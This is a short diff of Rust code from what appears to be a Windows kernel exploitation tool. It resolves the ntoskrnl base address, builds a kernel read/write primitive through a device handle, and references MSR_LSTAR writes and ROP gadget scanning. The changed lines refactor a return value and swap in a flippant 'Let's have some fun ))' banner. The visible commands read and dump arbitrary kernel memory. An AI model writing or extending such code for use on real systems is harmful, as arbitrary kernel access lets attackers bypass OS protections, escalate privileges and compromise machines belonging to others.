@@ -5,32 +5,32 @@ use windows_sys::Win32::System::Threading::{GetCurrentThread, SetThreadAffinityM
 use crate::device::{msr_read, msr_write, Device, MSR_FMASK, MSR_LSTAR};
 use crate::gadgets::scan_gadgets_in_pe;
 use crate::kernel_rw::KernelRW;
-use crate::utils::{find_mod, get_kernel_modules, ntoskrnl_disk_path};
+use crate::utils::{find_mod, get_kernel_modules, ntoskrnl_disk_path, KernelMod};
 
 const THREAD_PRIORITY_TIME_CRITICAL: i32 = 15;
 const THREAD_PRIORITY_NORMAL: i32 = 0;
 
-pub fn open_krw(dev: &Device) -> Result<(KernelRW<'_>, Vec<u8>)> {
+pub fn open_krw(dev: &Device) -> Result<(KernelRW<'_>, Vec<u8>, KernelMod)> {
     let mods = get_kernel_modules()?;
     let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
     println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
     let path = ntoskrnl_disk_path(&mods)?;
     let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
     let krw = KernelRW::setup(dev, &pe, nt.va)?;
-    println!("[+] KernelRW ready");
+    println!("[+] Let's have some fun ))");
     { use std::io::Write; let _ = std::io::stdout().flush(); }
-    Ok((krw, pe))
+    Ok((krw, pe, nt))
 }
 
 pub fn cmd_kread(dev: &Device, target_va: u64) -> Result<()> {
-    let (krw, _) = open_krw(dev)?;
+    let (krw, _, _) = open_krw(dev)?;
     let val = krw.kread(target_va)?;
     println!("[+] kread [0x{:016X}] = 0x{:016X}  ({})", target_va, val, val);
     Ok(())
 }
 
 pub fn cmd_kdump(dev: &Device, target_va: u64, count: u64) -> Result<()> {
-    let (krw, _) = open_krw(dev)?;
+    let (krw, _, _) = open_krw(dev)?;
     println!("[+] dumping {} qwords from 0x{:016X}:", count, target_va);
     for i in 0..count {
         let addr = target_va + i * 8;
